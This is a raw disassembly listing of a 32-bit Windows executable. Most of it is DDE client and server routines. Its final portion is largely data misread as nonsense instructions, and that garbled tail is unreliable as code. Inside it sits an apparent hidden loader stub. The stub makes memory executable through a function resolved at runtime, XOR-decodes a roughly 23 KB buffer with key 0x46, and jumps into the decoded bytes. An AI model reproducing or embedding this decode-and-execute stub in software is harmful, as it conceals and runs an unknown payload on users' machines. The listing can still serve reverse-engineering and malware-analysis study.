call sub_46d2bc
push esi
call DdeFreeDataHandle
mov bl 0x1
jmp r-xdata
sub_46d410
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] 0x0
mov eax [ ebx + 0xc ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov al [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax [ ebx + 0x4 ]
call sub_4042c8
test eax eax
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
lea edx [ esp + 0x4 ]
push edx
push 0x3e8
push 0x1034
mov eax [ ebx + 0xc ]
mov edx [ eax + 0xa8 ]
push edx
mov edx [ ebx + 0x8 ]
push edx
mov eax [ eax + 0x38 ]
push eax
push 0xffffffff
push 0x0
call DdeClientTransaction
test eax eax
jne r-xdata
push 0x3ec
mov eax [ ebx + 0x4 ]
call sub_4044c8
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x8 ] eax
mov [ esp ] 0x1
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeGetLastError
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
sub_46d4c8
push ebx
push esi
push ecx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov eax ebx
call sub_46d508
mov al 0x1
pop edx
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
test edx edx
je r-xdata
push esp
push 0x3e8
push 0x8040
mov ecx [ esi + 0xa8 ]
push ecx
push edx
push eax
push 0xffffffff
push 0x0
call DdeClientTransaction
sub_46d508
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
pop ebx
retn
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x8 ] eax
sub_46d534
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420714
mov [ esi + 0x48 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ esi + 0x30 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_46d580
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x30 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420760
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_46d5c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_404008
pop esi
pop ebx
retn
mov ecx esi
xor edx edx
mov eax [ ebx + 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_46d5ec
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x48 ] 0x1
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax ebx
call sub_46d69c
pop esi
pop ebx
retn
sub_46d618
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46d68c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x8 ]
pop edx
call sub_407e88
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d693
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
mov [ ebx + 0x48 ] 0x1
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax ebx
call sub_46d69c
sub_46d69c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_46d723
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3a ] 0x0
je r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ ebx + 0x8 ]
mov eax [ rw-data ]
call sub_46c500
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d72a
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_448af4
mov edx [ ebp - 0x4 ]
mov ecx [ ebx + 0x8 ]
mov eax [ rw-data ]
call sub_46c500
sub_46d730
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_46d7b3
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push edi
call DdeAccessData
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d7ba
lea eax [ ebp - 0xc ]
call sub_404008
retn
lea eax [ ebp - 0xc ]
mov edx esi
call sub_404200
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
push edi
call DdeUnaccessData
mov eax ebx
call sub_46d69c
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x8000
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_46d7d8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_420a30
cmp esi [ edi + 0x34 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor eax eax
mov [ edi + 0x34 ] eax
sub_46d800
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420714
mov edx esi
mov eax [ rw-data ]
call sub_46c564
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_46d844
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_46c578
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420760
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_46d878
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi eax
xor eax eax
push ebp
push j_sub_403a0c#6
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
lea eax [ ebp - 0x4 ]
push eax
push edx
call DdeAccessData
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d90a
lea eax [ ebp - 0xc ]
call sub_404008
retn
cmp [ esi + 0x42 ] 0x0
je r-xdata
mov edi 0x8000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404200
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ esi + 0x44 ]
call [ esi + 0x40 ]
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_46d93c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420714
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ esi + 0x44 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_46d980
push ebx
push esi
push edi
push ebp
call sub_403644
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x40 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x34 ]
test eax eax
je r-xdata
push eax
call DdeDisconnect
mov eax [ ebp + 0x44 ]
call sub_403290
xor eax eax
mov [ ebp + 0x44 ] eax
inc esi
xor edi edi
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_420760
test bl bl
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebp + 0x34 ] eax
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_418310
call sub_403290
inc edi
dec esi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40362c
sub_46da04
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x100c ] ebx
mov [ ebp - 0x1008 ] ebx
mov ebx eax
xor eax eax
push ebp
push j_sub_403a0c#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46db2b
lea eax [ ebp - 0x100c ]
mov edx 0x2
call sub_40402c
retn
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1001 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x1008 ]
lea edx [ ebp - 0x1001 ]
mov ecx 0x1000
call sub_404278
mov eax [ ebp - 0x1008 ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_46dd50
mov edi eax
test edi edi
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46dec8
mov esi eax
mov [ esi + 0x3c ] edi
lea eax [ ebp - 0x100c ]
lea edx [ ebp - 0x1001 ]
mov ecx 0x1000
call sub_404278
mov edx [ ebp - 0x100c ]
mov eax esi
call sub_46e024
mov edx esi
mov eax [ ebx + 0x44 ]
call sub_4181b4
mov edx ebx
mov eax esi
call sub_4207e4
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov [ ebp - 0x1 ] 0x1
push 0x3ec
mov eax [ ebx + 0x30 ]
call sub_4044c8
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x34 ] eax
sub_46db38
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_46de74
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov edx ebx
mov eax [ esi + 0x44 ]
call sub_4184ac
mov eax ebx
call sub_403290
sub_46db68
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1004 ] ebx
mov ebx eax
xor eax eax
push ebp
push j_sub_403a0c#4
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dc12
lea eax [ ebp - 0x1004 ]
call sub_404008
retn
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1000 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x1004 ]
lea edx [ ebp - 0x1000 ]
mov ecx 0x1000
call sub_404278
mov eax [ ebp - 0x1004 ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_46dd50
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
call sub_46d730
mov esi eax
sub_46dc1c
push ebp
mov ebp esp
xor edx edx
mov ecx [ eax + 0x3c ]
test ecx ecx
je r-xdata
mov eax edx
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov eax ecx
call sub_46d878
mov edx eax
sub_46dc3c
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x100c ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx eax
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_46dd3d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax ebx
call sub_46de74
test eax eax
je r-xdata
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x100c ]
lea edx [ ebp - 0x1008 ]
mov ecx 0x1000
call sub_404278
mov eax [ ebp - 0x100c ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_46dd50
mov ebx eax
test ebx ebx
je r-xdata
mov dx [ ebp + 0x8 ]
call sub_46df40
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dd44
lea eax [ ebp - 0x100c ]
call sub_404008
lea eax [ ebp - 0x8 ]
call sub_404008
retn
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push 0x0
movzx eax [ ebp + 0x8 ]
push eax
push esi
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4042c8
inc eax
push eax
mov eax [ ebp - 0x8 ]
call sub_4044c8
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov [ ebp - 0x4 ] eax
sub_46dd50
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov edi edx
test edi edi
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax edi
call sub_420d38
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
inc esi
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404414
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x4 ]
inc [ ebp - 0x10 ]
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46dd50
test eax eax
je r-xdata
mov eax [ ebx + 0x34 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_420d0c
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
sub_46de24
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x44 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_418310
mov ebx eax
mov eax [ ebx + 0x34 ]
mov edx [ esp ]
call sub_404414
jne r-xdata
sub_46de74
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x44 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_418310
mov ebx eax
mov eax [ esp ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call DdeCmpStringHandles
test eax eax
jne r-xdata
sub_46dec8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x30 ] ecx
xor edx edx
mov eax esi
call sub_420714
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_46df00
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420760
test bl bl
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ esi + 0x38 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_46df40
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46dff5
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1004 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1004 ]
lea eax [ ebx + 0x34 ]
call sub_4040f8
cmp si 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dffc
lea eax [ ebp - 0x4 ]
call sub_404008
retn
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push 0x0
movzx eax si
push eax
mov eax [ ebx + 0x38 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4042c8
inc eax
push eax
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov edi eax
sub_46e024
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x34 ]
mov edx esi
call sub_40405c
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x34 ]
call sub_4042c8
test eax eax
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
push 0x3ec
mov eax [ ebx + 0x34 ]
call sub_4044c8
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x38 ] eax
sub_46e080
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403a0c#3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e0b8
retn
mov eax rw-data
call sub_40d070
sub_46e0bc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46bf10
mov [ rw-data ] eax
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417990
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417990
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417990
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417990
sub_46e124
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
jecxz r-xdata
adc al [ esi ]
jo r-xdata
add [ eax - 0x1e ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x400046e3 ] bl
add eax [ eax ]
add [ eax ] dh
loop r-xdata
jl r-xdata
inc esi
add [ ebx + edx + 0x46 ] bh
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
add ah dh
sbb eax [ esi ]
add [ esi + ecx + 0xe580042 ] al
inc esi
add [ eax + edx ] cl
inc esi
add ah dl
xor al 0x40
add [ eax + 0x34 ] bh
inc esi
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
je r-xdata
stc
inc esp
add [ esi + edi * 8 ] ah
inc esp
add [ eax - 0x3 ] dh
inc esp
add [ eax ] bh
jle r-xdata
inc edx
add [ edi + edx * 2 + 0xccc0046 ] dl
inc esi
add [ eax ] cl
inc esi
add [ eax + 0x12 ] dh
inc esi
add ah dh
std
inc esp
add ah ah
adc eax 0x890c0046
inc ecx
add [ edx + edx ] dh
add al cl
in al dx
inc esp
add [ eax - 0x33ffbb0f ] dh
or eax [ esi ]
fsub [ edx ]
inc esi
add [ edi + eax * 8 + 0x44 ] bh
add [ edi + ebp + 0x32fc0046 ] bl
inc esi
add [ eax + 0x14004631 ] bh
enter 0x44 0x18
add [ ebx + esi * 8 + 0x18d40044 ] al
inc esi
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 + 0x19c80044 ] al
inc esi
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
add eax [ eax ]
add [ esi ] al
or [ ebx ] al
add [ eax ] al
add eax [ eax ]
pop es
inc edx
jne r-xdata
enter 0x44 0x34
xor al 0x46
add [ eax - 0x3a ] bh
inc esp
add al dh
inc esp
add [ eax ] ch
cmp eax [ esi ]
in al 0x4
inc ebp
add [ edi + ebp * 8 + 0x44 ] ch
add [ eax + edx * 2 ] bh
inc esi
add al al
add eax 0x8700046
inc esi
add [ ecx + eax * 2 ] bl
inc esi
add [ eax + 0x11 ] bl
inc esi
add ah dl
adc [ esi ] eax
sbb al 0x54
inc esi
add [ eax + 0x2000460e ] dl
dec edi
inc esi
add [ eax ] al
inc esi
add ah dl
push eax
inc esi
add [ eax + 0x1200461b ] bh
add [ eax - 0x7ffb91d ] ah
add al [ eax ]
add [ eax ] al
add [ esi ] al
dec esp
popad
bound esp [ ebp + 0x6c ]
xor esp edi
add al [ eax ]
add [ ecx ] al
add [ ecx ] cl
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x31756e65
add [ ebx ] al
add [ eax ] al
add [ eax ] al
push es
dec esp
popad
bound esp [ ebp + 0x6c ]
xor al [ ebx + eax ]
add [ eax ] al
add al [ eax ]
or [ ebx + 0x68 ] eax
arpl [ gs : ebx + 0x42 ] bp
outsd
js r-xdata
add [ eax ] bl
add [ eax - 0x76 ] dl
inc esp
add [ ebx + ebx + 0x1a880046 ] bh
inc esi
add [ eax + 0x3400448b ] cl
sbb al 0x46
add [ eax ] dh
scasb [ edi ]
inc esp
add [ eax ] dl
int1
inc esp
add ah cl
int1
inc esp
inc edx
sbb al 0x3
add [ eax ] al
or [ eax ] al
or [ eax + 0x61 ] edx
imul ebp [ esi + 0x74 ] 0x31786f42
and [ ebx ] al
add [ eax ] al
or [ eax ] eax
push cs
inc esp
push ebx
jb r-xdata
add [ eax ] al
or al [ eax ]
or [ ebx + 0x6f ] eax
insb
outsd
jb r-xdata
je r-xdata
popad
jb r-xdata
sub [ ebx ] al
add [ eax ] al
or eax [ eax ]
or eax 0x63656843
imul ecx [ ecx + ebp * 2 + 0x73 ] 0x74
inc edx
outsd
js r-xdata
add eax [ eax ]
add [ eax ] dl
add [ eax ] cl
jb r-xdata
push 0x656c6143
outsb
outsd
xor [ ebx + eax ] esp
outsb
xor [ ebx + eax ] ecx
add [ eax ] al
add al 0x0
or [ edi + 0x72 ] eax
outsd
jne r-xdata
inc ebx
outsd
xor al 0x3
add [ eax ] al
push cs
popad
jb r-xdata
sub al 0x3
add [ eax ] al
or al 0x0
push es
push ebx
push 0x31657061
xor [ ebx ] al
add [ eax ] al
or eax 0x72500c00
outsd
jb r-xdata
in al 0xe6
inc edx
push es
push esp
inc esi
outsd
jb r-xdata
add [ esi ] cl
dec ebp
outsd
outsb
je r-xdata
add eax [ eax ]
add [ esi ] cl
je r-xdata
je r-xdata
cmp [ ebx ] al
add [ eax ] al
str [ esi ]
dec eax
popad
js r-xdata
inc edx
outsd
js r-xdata
inc ebx
add [ eax ] ah
sbb al [ ebx ]
call 0xffffffff8b472712
shr ah 0xe3
inc esi
add [ edi ] al
push es
push esp
inc esi
outsd
jb r-xdata
inc edx
add [ ecx + 0x39200043 ] dl
inc ebx
popad
insb
outsb
add [ edx + ebx * 4 ] bl
inc esi
add [ eax ] dh
rol [ edx ] cl
mov dl 0x46
add [ esi + edx * 8 - 0x48bbffbe ] al
inc esi
jae r-xdata
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x59d4
jne r-xdata
xor [ ecx + 0x46 ] ebp
add [ eax - 0x1d ] bh
inc ebp
add ah ah
out 0x42 al
xor [ ecx ] edx
add [ esi + 0x43 ] ah
add [ eax + edi * 2 + 0x45 ] dh
jb r-xdata
insd
call GetModuleHandleA
push eax
call GetProcAddress
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push eax
push 0x40
push 0x59d3
mov eax [ ebp + 0x8 ]
push eax
call [ ebp - 0x14 ]
add [ eax - 0x7ffbc43 ] bh
mov ah 0x43
add [ eax + 0x1400439d ] ch
fiadd [ edx ]
sub al 0x46
inc ebp
add [ edx + esi * 4 - 0x297bffba ] bh
inc edx
add [ edi + esi * 4 + 0x46 ] al
inc ebp
inc esp
mov bh 0x46
outsd
outsb
je r-xdata
outsb
je r-xdata
add [ ebx ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x31831
add [ edi ] al
add [ esi ] cl
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6e6f4374
adc [ ebx ] al
add [ eax ] al
add eax 0x61520b00
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xor [ ebx + eax ] edx
add [ eax ] al
push es
xchg esp eax
and [ ebx ] eax
and [ ecx ] bh
0xd2300046 0x42
inc edx
nop
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x8 ]
mov al [ eax ]
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
xor al 0x46
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x8 ]
mov [ edx ] al
nop
nop
mov eax [ ebp + 0x8 ]
add eax 0x35b6
mov [ ebp - 0x4 ] eax
nop
nop
jmp [ ebp - 0x4 ]
nop
push r-xdata
call sub_46e408
salc
salc
salc
salc
salc
salc
and bh cl
add edx [ esi + ebx - 0x665097d4 ]
add al [ esi + 0x46 ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn 0x1469
nop
push r-xdata
push r-xdata
jecxz r-xdata
outsd
insb
inc edx
popad
jb r-xdata
outsd
insb
xor [ ebx + eax ] edi
add [ eax ] al
adc [ eax ] al
or [ ebx + 0x6f ] al
arpl [ ebx + 0x4c ] bp
imul esi [ ebx + 0x74 ] 0x31786f42
jbe r-xdata
outsd
outsb
nop
xor eax eax
mov [ ebp - 0x8 ] eax
add [ esi ] bl
add eax 0x74696e55
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
add esp 0xffffffec
nop
cmp [ ebp + 0x8 ] 0x0
je r-xdata
sub_46e408
push ebp
mov ebp esp
add esp 0xffffffec
nop
cmp [ ebp + 0x8 ] 0x0
je r-xdata
nop
push r-xdata
call sub_46e408
salc
salc
salc
salc
salc
salc
and bh cl
add edx [ esi + ebx - 0x665097d4 ]
